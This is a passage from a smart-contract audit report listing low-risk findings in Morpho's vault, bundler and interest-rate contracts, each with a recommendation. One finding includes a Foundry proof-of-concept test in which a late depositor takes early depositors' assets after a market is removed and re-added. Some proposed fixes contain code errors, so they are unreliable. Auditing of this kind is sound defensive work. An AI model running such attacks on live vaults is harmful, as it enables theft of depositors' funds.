
                if (suppliedAssets == 0) continue;

                uint256 supplyCap = config[id].cap;
                if (supplyCap == 0) revert ErrorsLib.UnauthorizedMarket(id);

                if (supplyAssets + suppliedAssets > supplyCap) revert ErrorsLib.SupplyCapExceeded(id);

                // The market's loan asset is guaranteed to be the vault's asset because it has a non-zero supply cap.
                (, uint256 suppliedShares) =
                    MORPHO.supply(allocation.marketParams, suppliedAssets, 0, address(this), hex"");

                emit EventsLib.ReallocateSupply(_msgSender(), id, suppliedAssets, suppliedShares);

                totalSupplied += suppliedAssets;
            }
        }

        if (totalWithdrawn != totalSupplied) revert ErrorsLib.InconsistentReallocation();
    }
```

However, allocation doesn't trigger `_accrueFee` before the operations. This could lead to loss of deserved fee for fee recipient.

Consider this scenario : 

1. Users deposit to the vault and the vault allocates assets 10 ether to market A  and 10 ether to market B, with the configured vault fee is 5%.

2. After some blocks, interest accrued and assets grow to 11 ether inside market A and 11 ether inside market B.

3. Vault allocator decides to reallocate and withdraw from market A 5 ether and deposit to market B 5 ether. Vault assets allocation after reallocate is 6 ether inside market A and 16 ether inside market B.

4. After some blocks, market A assets grew but market B's collateral price dropped compared to the loan token cause market assets inside market B decreased to 13 ether due to bad debt, causing Vaults assets allocation to 7 ether inside market A and 13 ether inside market B.

5. Now, when `_accrueFee` is triggered, fee recipient will not get any fee, while if `reallocate` triggers `_accrueFee`, fee recipient should get the profit from interest before reallocation and price drop happened.

**Recommendation**:

Trigger ` _accrueFee` and `_updateLastTotalAssets` before `reallocate` operation : 

```diff
    function reallocate(MarketAllocation[] calldata allocations) external onlyAllocatorRole {
+        _updateLastTotalAssets(_accrueFee());
        uint256 totalSupplied;
        uint256 totalWithdrawn;
        for (uint256 i; i < allocations.length; ++i) {
            MarketAllocation memory allocation = allocations[i];
            Id id = allocation.marketParams.id();

            (uint256 supplyAssets, uint256 supplyShares,) = _accruedSupplyBalance(allocation.marketParams, id);
            uint256 withdrawn = supplyAssets.zeroFloorSub(allocation.assets);

            if (withdrawn > 0) {
                if (allocation.marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);

                // Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market.
                uint256 shares;
                if (allocation.assets == 0) {
                    shares = supplyShares;
                    withdrawn = 0;
                }

                (uint256 withdrawnAssets, uint256 withdrawnShares) =
                    MORPHO.withdraw(allocation.marketParams, withdrawn, shares, address(this), address(this));

                emit EventsLib.ReallocateWithdraw(_msgSender(), id, withdrawnAssets, withdrawnShares);

                totalWithdrawn += withdrawnAssets;
            } else {
                uint256 suppliedAssets = allocation.assets == type(uint256).max
                    ? totalWithdrawn.zeroFloorSub(totalSupplied)
                    : allocation.assets.zeroFloorSub(supplyAssets);

                if (suppliedAssets == 0) continue;

                uint256 supplyCap = config[id].cap;
                if (supplyCap == 0) revert ErrorsLib.UnauthorizedMarket(id);

                if (supplyAssets + suppliedAssets > supplyCap) revert ErrorsLib.SupplyCapExceeded(id);

                // The market's loan asset is guaranteed to be the vault's asset because it has a non-zero supply cap.
                (, uint256 suppliedShares) =
                    MORPHO.supply(allocation.marketParams, suppliedAssets, 0, address(this), hex"");

                emit EventsLib.ReallocateSupply(_msgSender(), id, suppliedAssets, suppliedShares);

                totalSupplied += suppliedAssets;
            }
        }

        if (totalWithdrawn != totalSupplied) revert ErrorsLib.InconsistentReallocation();
    }
```



### `submitMarketRemoval` could lead to condition where new depositors steal assets from early depositors

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

Market can forcefully removed from vault using timelocked call, in the case where vault interaction with market keep reverting, and can be added again once market can functions again. 

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L308-L318

```solidity
    function submitMarketRemoval(Id id) external onlyCuratorRole {
        if (config[id].removableAt != 0) revert ErrorsLib.AlreadySet();
        if (!config[id].enabled) revert ErrorsLib.MarketNotEnabled();

        _setCap(id, 0);

        // Safe "unchecked" cast because timelock <= MAX_TIMELOCK.
        config[id].removableAt = uint64(block.timestamp + timelock);

        emit EventsLib.SubmitMarketRemoval(_msgSender(), id);
    }
```

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L370-L376

```solidity
    function updateWithdrawQueue(uint256[] calldata indexes) external onlyAllocatorRole {
        uint256 newLength = indexes.length;
        uint256 currLength = withdrawQueue.length;

        bool[] memory seen = new bool[](currLength);
        Id[] memory newWithdrawQueue = new Id[](newLength);

        for (uint256 i; i < newLength; ++i) {
            uint256 prevIndex = indexes[i];

            // If prevIndex >= currLength, it will revert with native "Index out of bounds".
            Id id = withdrawQueue[prevIndex];
            if (seen[prevIndex]) revert ErrorsLib.DuplicateMarket(id);
            seen[prevIndex] = true;

            newWithdrawQueue[i] = id;
        }

        for (uint256 i; i < currLength; ++i) {
            if (!seen[i]) {
                Id id = withdrawQueue[i];

                if (config[id].cap != 0) revert ErrorsLib.InvalidMarketRemovalNonZeroCap(id);

>>>             if (MORPHO.supplyShares(id, address(this)) != 0) {
                    if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);

                    if (block.timestamp < config[id].removableAt) {
                        revert ErrorsLib.InvalidMarketRemovalTimelockNotElapsed(id);
                    }
                }

                delete config[id];
            }
        }

        withdrawQueue = newWithdrawQueue;

        emit EventsLib.SetWithdrawQueue(_msgSender(), newWithdrawQueue);
    }
```

However, this design will not favor vault depositors before forced market removal, as market removal will reduce the total assets counted inside the vault and will reduce the vault's share price. Now the new depositors can purchase the vault's share at a cheaper price, and once the broken market is fixed and added again to the vault, they can steal profit from early depositors.

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L559-L569

```solidity
    function deposit(uint256 assets, address receiver) public override returns (uint256 shares) {
>>>     uint256 newTotalAssets = _accrueFee();

        // Update `lastTotalAssets` to avoid an inconsistent state in a re-entrant context.
        // It is updated again in `_deposit`.
        lastTotalAssets = newTotalAssets;

        shares = _convertToSharesWithTotals(assets, totalSupply(), newTotalAssets, Math.Rounding.Floor);

        _deposit(_msgSender(), receiver, assets, shares);
    }
```

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L905

```solidity
    function _accrueFee() internal returns (uint256 newTotalAssets) {
        uint256 feeShares;
>>>     (feeShares, newTotalAssets) = _accruedFeeShares();

        if (feeShares != 0) _mint(feeRecipient, feeShares);

        emit EventsLib.AccrueInterest(newTotalAssets, feeShares);
    }
```

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L915

```solidity
    function _accruedFeeShares() internal view returns (uint256 feeShares, uint256 newTotalAssets) {
>>>     newTotalAssets = totalAssets();

        uint256 totalInterest = newTotalAssets.zeroFloorSub(lastTotalAssets);
        if (totalInterest != 0 && fee != 0) {
            uint256 feeAssets = totalInterest.mulDiv(fee, WAD);
            // The fee assets is subtracted from the total assets in this calculation to compensate for the fact
            // that total assets is already increased by the total interest (including the fee assets).
            feeShares =
                _convertToSharesWithTotals(feeAssets, totalSupply(), newTotalAssets - feeAssets, Math.Rounding.Floor);
        }
    }
```

It can be observed that if the broken market removed, the assets inside the market will not be counted and the vault's shares price will drop.

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L613-L617

```solidity
    function totalAssets() public view override returns (uint256 assets) {
        for (uint256 i; i < withdrawQueue.length; ++i) {
            assets += MORPHO.expectedSupplyAssets(_marketParams(withdrawQueue[i]), address(this));
        }
    }
```

**Coded PoC** : 

The scenario is vaults have 4 markets with evenly distributed assets, and one of the markets stops functioning and is removed from the vault. Attacker see this and deposit to the market once the broken market is removed. Once the market is added again to the vault, the attacker redeems his share and steals early depositors' assets.

Add this test to `metamorpho/test/forge/MarketTest.sol`.

```solidity
   function testAbuseDisabledMarket() public {
        _setCap(idleParams, 20 ether);
        _setCap(allMarkets[0], 20 ether);
        _setCap(allMarkets[1], 20 ether);
        _setCap(allMarkets[2], 20 ether);
        loanToken.setBalance(SUPPLIER, 40 ether);

        vm.prank(SUPPLIER);
        vault.deposit(40 ether, SUPPLIER);

        // market reallocate so its allocation balanced

        allocations.push(MarketAllocation(idleParams, 10 ether));
        allocations.push(MarketAllocation(allMarkets[0], 10 ether));
        allocations.push(MarketAllocation(allMarkets[1], 10 ether));
        allocations.push(MarketAllocation(allMarkets[2], 10 ether));
        vm.prank(ALLOCATOR);
        vault.reallocate(allocations);

        console.log("supply assets inside idle :");
        console.log(morpho.expectedSupplyAssets(idleParams, address(vault)));
        console.log("supply assets inside market 0 :");
        console.log(morpho.expectedSupplyAssets(allMarkets[0], address(vault)));
        console.log("supply assets inside market 1 :");
        console.log(morpho.expectedSupplyAssets(allMarkets[1], address(vault)));
        console.log("supply assets inside market 2 :");
        console.log(morpho.expectedSupplyAssets(allMarkets[2], address(vault)));
        console.log("last total assets accounted inside vault before :");
        console.log(vault.totalAssets());

        _setCap(allMarkets[2], 0);

        vm.prank(CURATOR);
        vault.submitMarketRemoval(allMarkets[2].id());

        vm.warp(block.timestamp + TIMELOCK);

        uint256[] memory indexes = new uint256[](3);
        indexes[0] = 0;
        indexes[1] = 2;
        indexes[2] = 1;

        Id[] memory expectedWithdrawQueue = new Id[](3);
        expectedWithdrawQueue[0] = idleParams.id();
        expectedWithdrawQueue[1] = allMarkets[1].id();
        expectedWithdrawQueue[2] = allMarkets[0].id();

        vm.expectEmit();
        emit EventsLib.SetWithdrawQueue(ALLOCATOR, expectedWithdrawQueue);
        vm.prank(ALLOCATOR);
        vault.updateWithdrawQueue(indexes);

        console.log("last total assets accounted inside vault after removal :");
        console.log(vault.totalAssets());

        // alice see this market 2 removal

        address alice = address(0xABCD);

        loanToken.setBalance(alice, 30 ether);
        console.log("balance alice before deposit, after market 2 removal : ");
        console.log(loanToken.balanceOf(alice));
        vm.startPrank(alice);
        loanToken.approve(address(vault), type(uint256).max);
        vault.deposit(30 ether, alice);
        vm.stopPrank();

        // market 2 is fixed and added again to the vaul
        _setCap(allMarkets[2], 20 ether);

        // alice redeem his vault share
        vm.startPrank(alice);
        vault.redeem(vault.balanceOf(alice), alice, alice);
        console.log("balance alice after market 2 added again and redeem : ");
        console.log(loanToken.balanceOf(alice));

    }
```

Also add these lines in the `MarketTest` contract. 

```diff
contract MarketTest is IntegrationTest {
    using MarketParamsLib for MarketParams;
    using MorphoLib for IMorpho;
+   using MorphoBalancesLib for IMorpho;
+   MarketAllocation[] internal allocations;
   ..
}
```

Run the test : 

```shell
forge test --match-contract MarketTest --match-test testAbuseDisabledMarket -vvv
```

Log Output : 

```shell
Logs:
  supply assets inside idle :
  10000000000000000000
  supply assets inside market 0 :
  10000000000000000000
  supply assets inside market 1 :
  10000000000000000000
  supply assets inside market 2 :
  10000000000000000000

  last total assets accounted inside vault before :
  40000000000000000000

  last total assets accounted inside vault after removal :
  30000000000000000000

  balance alice before deposit, after market 2 removal : 
  30000000000000000000

  balance alice after market 2 added again and redeem : 
  34999999999999999999
```

It can be observed that alice (attacker) steal early depositor assets from the vault.

**Recommendation**:

If the removed market potentially added again to the market, implement some snapshot accounting that could protect early depositors assets, or add pause mechanism for deposit/mint functions.



### `maxWithdraw` and `maxRedeem` could return wrong value if called by vaut's fee recipient

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

`maxWithdraw` and ` maxRedeem` are ERC4626 standard functions that is required for vault's interaction with integrators.

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L545-L547

```solidity
    function maxWithdraw(address owner) public view override returns (uint256 assets) {
        (assets,,) = _maxWithdraw(owner);
    }
```

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L552-L556

```solidity
    function maxRedeem(address owner) public view override returns (uint256) {
        (uint256 assets, uint256 newTotalSupply, uint256 newTotalAssets) = _maxWithdraw(owner);

        return _convertToSharesWithTotals(assets, newTotalSupply, newTotalAssets, Math.Rounding.Floor);
    }
```

When the functions called, it will both need `assets` returned from `_maxWithdraw`. It will calculate `newTotalAssets` and `feeShares`, then calculate the `assets` by using `_convertToAssetsWithTotals`.

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L628-L639

```solidity
    function _maxWithdraw(address owner)
        internal
        view
        returns (uint256 assets, uint256 newTotalSupply, uint256 newTotalAssets)
    {
        uint256 feeShares;
        (feeShares, newTotalAssets) = _accruedFeeShares();
        newTotalSupply = totalSupply() + feeShares;

>>>     assets = _convertToAssetsWithTotals(balanceOf(owner), newTotalSupply, newTotalAssets, Math.Rounding.Floor);
        assets -= _simulateWithdrawMorpho(assets);
    }
```

However, this function could return wrong value if the caller is vault's fee recipient. When providing balance of `owner` to `_convertToAssetsWithTotals`, if the `owner` is fee recipient, it should also add `feeShares` to the calculation.

If it used by integrators and called by fee recipient, the returned value will be wrong and the integrators operations will proceed using the wrong value.

**Recommendation**:

If owner is fee recipient, add `feeShares` to the calculation.

```diff
    function _maxWithdraw(address owner)
        internal
        view
        returns (uint256 assets, uint256 newTotalSupply, uint256 newTotalAssets)
    {
        uint256 feeShares;
        (feeShares, newTotalAssets) = _accruedFeeShares();
        newTotalSupply = totalSupply() + feeShares;
+       uint256 shareBalances = balanceOf(owner);
+       if (owner == feeRecipient) {
+          shareBalances += feeShares;
+      }

-       assets = _convertToAssetsWithTotals(balanceOf(owner), newTotalSupply, newTotalAssets, Math.Rounding.Floor);
+       assets = _convertToAssetsWithTotals(shareBalances, newTotalSupply, newTotalAssets, Math.Rounding.Floor);
        assets -= _simulateWithdrawMorpho(assets);
    }
```



### Normal flow may duplicate supply queue

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L771-L771](metamorpho/src/MetaMorpho.sol#L771-L771)

**Description:** The allocator can set the `supplyQueue` through `setSupplyQueue()` function, the input array can be duplicated but it would only increase the cost of depositing on the vault. 
In a standard flow, there's a case where the supply queue might get duplicated when the allocator doesn’t intend for it

**POC:** To duplicate the supply queue, the market should be modified as follows:

1. Initially, the market has a cap, so it is included in both the `supplyQueue` and `withdrawQueue`.
2. The curator submits a request for market removal.
3. After the period ends, the market can be removed from the `withdrawQueue`. The allocator needs to call the `updateWithdrawQueue()` function to remove the market.
4. The curator then sets a cap for the market, adds it back to the `supplyQueue` array, and leaves a duplicated array

Using the `IntegrationTest` here is the code

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {IERC20Errors} from "../../lib/openzeppelin-contracts/contracts/interfaces/draft-IERC6093.sol";
import {UtilsLib} from "../../lib/morpho-blue/src/libraries/UtilsLib.sol";
import {SafeCast} from "../../lib/openzeppelin-contracts/contracts/utils/math/SafeCast.sol";
import {SharesMathLib} from "../../lib/morpho-blue/src/libraries/SharesMathLib.sol";

import "./helpers/IntegrationTest.sol";

contract ERC4626Test is IntegrationTest {
    using Math for uint256;
    using UtilsLib for uint256;
    using SafeCast for uint256;
    using SharesMathLib for uint256;
    using MorphoBalancesLib for IMorpho;
    using MarketParamsLib for MarketParams;
    using MathLib for uint256;
    using MarketParamsLib for MarketParams;

    uint256 constant FEE = 0.2 ether;

    function setUp() public override {
        super.setUp();
        _setFee(FEE);
         for (uint256 i; i < NB_MARKETS; ++i) {
            MarketParams memory marketParams = allMarkets[i];

            // Create some debt on the market to accrue interest.

            loanToken.setBalance(SUPPLIER, MAX_TEST_ASSETS);

            vm.prank(SUPPLIER);
            morpho.supply(marketParams, MAX_TEST_ASSETS, 0, ONBEHALF, hex"");

            uint256 collateral = uint256(MAX_TEST_ASSETS).wDivUp(marketParams.lltv);
            collateralToken.setBalance(BORROWER, collateral);

            vm.startPrank(BORROWER);
            morpho.supplyCollateral(marketParams, collateral, BORROWER, hex"");
            morpho.borrow(marketParams, MAX_TEST_ASSETS, 0, BORROWER, BORROWER);
            vm.stopPrank();
        }

        _setCap(allMarkets[0], CAP);
        _sortSupplyQueueIdleLast();
    }

    function testDuplicatingSupplyQueue() public {
        //@audit [market[0], idle]
        assertEq(vault.supplyQueueLength(), 2);
        
        //@audit Create a market removal
        Id id = allMarkets[0].id();
        vm.prank(CURATOR);
        vault.submitMarketRemoval(id);

        vm.warp(block.timestamp + vault.timelock());

        //@audit Remove market from withdraw queue
        uint256[] memory withdrawQueue = new uint[](1);
        withdrawQueue[0] = 0;

        vm.prank(ALLOCATOR);
        vault.updateWithdrawQueue(withdrawQueue);

        //@audit [market[0], idle]
        assertEq(vault.supplyQueueLength(), 2);

        //@audit [idle]
        assertEq(vault.withdrawQueueLength(), 1);

        //@audit Set the cap for same market
        _setCap(allMarkets[0], CAP);

        //@audit duplicated the value: [market[0], idle, market[0]]
        assertEq(vault.supplyQueueLength(), 3);

        Id market0 = vault.supplyQueue(0);
        Id market2 = vault.supplyQueue(2);

        bytes32 converted0;
        bytes32 converted2;

        //@audit convert Id to bytes32
        assembly ("memory-safe") {
            converted0 := market0
            converted2 := market2
        }

        //@audit This assertion passes, indicating duplication.
        assertEq(converted0, converted2);
    }
}
```

**Recommendation:** The recommendation would be adding a check for not adding an already added market.



### CompoundV3MigrationBundler is uncapable of withdrawing user's collateral from the Compound's instances

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Impact
- When the CompoundV3MigrationBundler::compoundV3WithdrawFrom() function is called to attempt to withdraw the user's collateral, the whole execution of the multicall transaction will be reverted because a runtime compilation error will occur when the returned value from the Compound::userCollateral() function (a Struct) is tried to be assigned to the balance variable (uint256) [See the Proof of Concept section for more details]

- Proof of Concept

- The CompoundV3MigrationBundler intends to allow users to Migrate positions from CompoundV3 to Morpho Blue, one of the functions that users can use to manage their compound's position and move their assets to Morpho Blue is the [`compoundV3WithdrawFrom() function`](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/morpho-blue-bundlers/src/migration/CompoundV3MigrationBundler.sol#L50), which allows users to withdraw their assets from Compound, this function allows users to withdraw the user's collateral that was deposited in Compound, the problem is that the function [`ICompoundV3(instance).userCollateral()`](https://github.com/compound-finance/comet/blob/main/contracts/CometStorage.sol#L71-L72) returns a struct, instead of a uint, because of the returned value is a struct, when the value is tried to be assigned to the `balance` variable, a "Type Error" will occur and will revert all the multicall execution, causing users to not being able to migrate their assets from compound to morpho, and also, users would waste their gas paying for a tx that always reverts.

- Let's do a walkthrough of the contracts to spot the exact issue:
> CompoundV3MigrationBundler.sol
```solidity
function compoundV3WithdrawFrom(address instance, address asset, uint256 amount) external payable protected {
    address _initiator = initiator();
    uint256 balance = asset == ICompoundV3(instance).baseToken()
        //@audit-ok => Compound.balanceOf() returns a uint256
        ? ICompoundV3(instance).balanceOf(_initiator)
        
        //@audit-issue => Compund.userCollateral() of the returns a struct, not a uint. 
        //@audit-issue => When trying to assign the returned value to the `balance` variable which is an uint256 it will throw an error about incompatible types
        : ICompoundV3(instance).userCollateral(_initiator, asset);

    amount = Math.min(amount, balance);

    require(amount != 0, ErrorsLib.ZERO_AMOUNT);

    ICompoundV3(instance).withdrawFrom(_initiator, address(this), asset, amount);
}
```

- By looking at the code of the CompoundV3 Protocol, we realize that the call to userColleral() it actually [calls a public mapping defined in the CometStorage.sol](https://github.com/compound-finance/comet/blob/main/contracts/CometStorage.sol#L71-L72) (which is a contract that main contract inherits from), and this mapping ends up [returning a Struct](https://github.com/compound-finance/comet/blob/main/contracts/CometStorage.sol#L37-L40)
> CompoundV3 Protocol, CometStorage.sol 
```solidity
contract CometStorage {
  ...
  //@audit-info => This is the returned Struct when userCollateral() is called!
  struct UserCollateral {
    uint128 balance;
    uint128 _reserved;
  }
  ...

  //@audit-info => This is the public mapping that is called from the CompoundV3MigrationBundler::compoundV3WithdrawFrom()
  mapping(address => mapping(address => UserCollateral)) public userCollateral;
}
```

- As we've just seen in the previous walkthrough, as a result of not decoding the received struct and just trying to assign it directly to a variable of type uin256, the whole execution will be blown up. All changes will be reverted, causing users to lose all the gas that will be paid for the failed execution.

- Tools Used
Manual Audit, [CompoundV3 Contracts in GitHub](https://github.com/compound-finance/comet/blob/main/contracts/Comet.sol) & [CompundV3 Contract Deployed in Mainnet](https://etherscan.io/address/0xc3d688B66703497DAA19211EEdff47f25384cdc3#readProxyContract#F49)

- Recommended Mitigation Steps
- The mitigation for this issue is to make sure to decode the received struct and [assign the value of the variable `balance`](https://github.com/compound-finance/comet/blob/main/contracts/CometStorage.sol#L38).

> CompoundV3MigrationBundler.sol
```solidity
function compoundV3WithdrawFrom(address instance, address asset, uint256 amount) external payable protected {
    address _initiator = initiator();
-   uint256 balance = asset == ICompoundV3(instance).baseToken()
-       ? ICompoundV3(instance).balanceOf(_initiator)        
-       : ICompoundV3(instance).userCollateral(_initiator, asset);

+   uint256 balance;
+   if(asset == ICompoundV3(instance).baseToken()) {
+       balance = ICompoundV3(instance).balanceOf(_initiator);
+   } else {
+     //@audit-ok => Extract the value of the `balance` variable returned from the Compound Contract
+     (uint128 _balance, ) = ICompoundV3(instance).balanceOf(_initiator);
+     balance = uint256(_balance);
+   }

    amount = Math.min(amount, balance);

    require(amount != 0, ErrorsLib.ZERO_AMOUNT);

    ICompoundV3(instance).withdrawFrom(_initiator, address(this), asset, amount);
}
```



### Bundler does not work with default `ERC20PermissionedBase`

**Severity:** Low risk

**Context:** [ERC20PermissionedBase.sol#L53-L53](erc20-permissioned/src/ERC20PermissionedBase.sol#L53-L53)

**Description**: The `ERC20PermissionedBase` contract gives permissions to send and receive tokens only to the ERC20WrapperBundler itself and the Morpho blue contract:

```solidity
function hasPermission(address account) public view virtual returns (bool) {
    return account == address(0) || account == MORPHO || account == BUNDLER;
}
```

However, the bundler tries to transfer tokens from the multi-call initiator which will revert:

```solidity
ERC20Wrapper(wrapper).depositFor(initiator(), amount);
```

The bundler does not work with the default implementation.

The README only states:

> It's possible to deploy permissioned token wrapper of permissionless tokens by inheriting from [`ERC20PermissionedBase`](src/ERC20PermissionedBase.sol).

**Recommendation**: Document how to build a permissioned market and how the bundler is involved. The `hasPermission` function likely needs to be overridden for it to work and the market should be created using the permissioned token as the loan token, not the underlying.



### Create methods are suspicious of the reorg attack	_(duplicate of [Using CREATE2 with a user-specified `salt` makes `createMetaMorpho()` susceptible to front-running])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- [L-01] create methods are suspicious of the reorg attack

After calling [`MetaMorphoFactory::createMorpho() function`](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorphoFactory.sol#L43), a new MetaMorpho Vault will be created and registered as a valid vault in the Factory. In events of chain reorganization, users who deposit their assets in the new Vault could end up losing their assets because a malicious actor could deploy a Vault with the same salt and take over the Vault's ownership.

1. Alice creates a new MetaMorpho Vault
2. Bob notices the ongoing reorg (or just does it by coincidence), and creates a new MetaMorpho Vault with the same salt that Alice used
3. Alice deposit funds in the Vault she created.
4. Reorg is resolved in Bob's favor, thus, Bob is the owner of the Metamorpho Vault where Alice deposited her assets.
5. Alice deposit tx is mined. She ends up depositing her assets in the Vault where Bob is the owner.


**Fix:**
- Hash the `msg.sender` with the provided `salt` and use this new hash as the final salt to create the new contract
```
function createMetaMorpho(
    ...
    bytes32 salt
) external returns (MetaMorpho metaMorpho) {
+   salt = keccak256(salt,msg.sender);
    metaMorpho = new MetaMorpho{salt: salt}(initialOwner, MORPHO, initialTimelock, asset, name, symbol);
    ...
}
```



### Bundlers users could lose some or all of their tokens if they don`t settle their balance properly

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
When performing a multicall to a bundler user must take into account all token inputs and add the needed withdraw transactions at the end of the bundle, to settle the balance properly. If user doesn't specify the exact withdrawals at the end of the interaction, or doesn't at all, his tokens are likely to be lost, since they will be left in the contract and next caller could use them as theirs. In some cases it may be difficult to know the needed withdrawals in advance. For instance, when calling `CompoundV3MigrationBundler::compundV3WithdrawFrom` specifying `amount`as `type(uint256).max`, meaning that will withdraw all his balance from compound.
 

**Recommendation**:
Add an internal accounting system, and force the user to settle his balance properly at the end of the interaction, just like [UniswapV4](https://github.com/Uniswap/v4-core/tree/main/src) does. Uniswap V4 is similar in this case because it only has 1 entry point(such as `multicall`) that allows users to perform arbitrary calls inside the contract.


**If user does not settle his balance the whole transaction reverts**:
```solidity
 /// UniswapV4::PoolManager
    function lock(bytes calldata data) external override returns (bytes memory result) {
        Lockers.push(msg.sender);

        // the caller does everything in this callback, including paying what they owe via calls to settle
        result = ILockCallback(msg.sender).lockAcquired(data);

        if (Lockers.length() == 1) {
            if (Lockers.nonzeroDeltaCount() != 0) revert CurrencyNotSettled();
            Lockers.clear();
        } else {
            Lockers.pop();
        }
```



### Function `createUrd` and `createMetaMorpho` could be frontrun making the original transaction to fail	_(duplicate of [Using CREATE2 with a user-specified `salt` makes `createMetaMorpho()` susceptible to front-running])_

**Severity:** Low risk

**Context:** [MetaMorphoFactory.sol#L51-L51](metamorpho/src/MetaMorphoFactory.sol#L51-L51), [UrdFactory.sol#L33-L38](universal-rewards-distributor/src/UrdFactory.sol#L33-L38)

**Description**: An attacker could observe a pending transaction calling `createUrd` or `createMetaMorpho`, and then broadcast their own transaction with a higher gas price, using the same salt value. This would lead to the original transaction to fail when it is processed (due a fail on the `CREATE2`). This could disrupt the normal flow of operations, especially if `createUrd` or `createMetaMorpho` is part of a larger, dependent transaction sequence in a smart contract system.

**Recommendation**: Educate Users/devs, inform about the potential risk of front-running in the system's documentation, advising them to take this in consideration while developing an integration with Morpho.
You could also generate a new salt base on the original salt and the  `msg.sender`.




### `wExp()` error can be amplified by repeatedly calling `borrowRate()` to influence `rateAtTarget`

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Context:**

- [ExpLib.sol](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/adaptive-curve/ExpLib.sol)
- [ExpLibTest.sol#L19-L24](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/test/ExpLibTest.sol#L19-L24)
- [AdaptiveCurveIrm.sol#L182-L189](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L182-L189)
- [AdaptiveCurveIrm.sol#L137-L141](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L137-L141)

**Description:**

Morpho Blue IRM implements its own exponential function, `wExp()` in `ExpLib.sol`. The function is allowed to have a 1% error, which means the value returned by `wExp()` can be 1% off from $e^x$. This can be seen in the following test, which compares `wExp()` to [Solmate's `SignedWadMath.wadExp()`](https://github.com/transmissions11/solmate/blob/main/src/utils/SignedWadMath.sol#L106-L163):

```solidity
function testWExp(int256 x) public {
    // Bounded to have sub-1% relative error.
    x = bound(x, LN_GWEI_INT, ExpLib.WEXP_UPPER_BOUND);

    assertApproxEqRel(ExpLib.wExp(x), wadExp(x), 0.01 ether);
}
```

For example:
- When `x = 342465753424608000`:
  - `wExp(x) = 1401107149558950203`
  - `wadExp(x) = 1408416119407487915`
  - Assuming `wadExp()` is accurate, `wExp()` is -0.519% off (negative error).
- When `x = 346575342465703296`:
  - `wExp(x) = 1426968362771537472`
  - `wadExp(x) = 1414216040340090046`
  - Assuming `wadExp()` is accurate, `wExp()` is 0.902% off (positive error).

`wExp()` is used to calculate the market's new `rateAtTarget` in `AdaptiveCurveIrm.sol`:

```solidity
function _newRateAtTarget(int256 startRateAtTarget, int256 linearAdaptation) private pure returns (int256) {
    // Non negative because MIN_RATE_AT_TARGET > 0.
    return startRateAtTarget.wMulDown(ExpLib.wExp(linearAdaptation)).bound(
        ConstantsLib.MIN_RATE_AT_TARGET, ConstantsLib.MAX_RATE_AT_TARGET
    );
}
```

The formula to calculate `rateAtTarget` is given below (where $L$ is `linearAdaptation`):

$$ rate_{new}=rate_{old}\times {e^L} $$

When including the error of `wExp()`, the formula becomes:

$$ rate_{new}=rate_{old}\times {(1+error)\times e^L} $$

Since the [`rateAtTarget` is set to `endRateAtTarget`](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L105-L107), which is [used as `startRateAtTarget`](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L125) the next time `borrowRate()` is called, the calculation for `rateAtTarget` actually compounds when `borrowRate()` is called multiple times. More specifically, if $n$ is the number of times `borrowRate()` is called, `rateAtTarget` can be calculated as:

$$ rate_{new}=rate_{old}\times ({(1+error)\times e^L})^n=rate_{old}\times (1+error)^n\times e^{nL} $$

As seen from above, the error of `wExp()` also compounds when `borrowRate()` is called multiple times. For example, assuming:

- `linearAdaptation = 342465753424608000`, which means `wExp()` has an error of -0.519% as mentioned above
- `borrowRate()` is called 40 times
 
$rate_{new}$ is calculated as:

$$rate_{new}=rate_{old}\times (1-0.00519)^{40}\times e^{40L}= rate_{old}\times 0.812\ e^{40L}$$

Due to the calculation's compounding nature, the error of `wExp()` is amplified, causing $rate_{new}$ to be 18.8% smaller than what it would have been if `wExp()` had no error.

This becomes a problem as `rateAtTarget`, which determines a market's interest rate, can be influenced by strategically calling `borrowRate()` when `linearAdaptation` is a value where `wExp()` has a large error. 

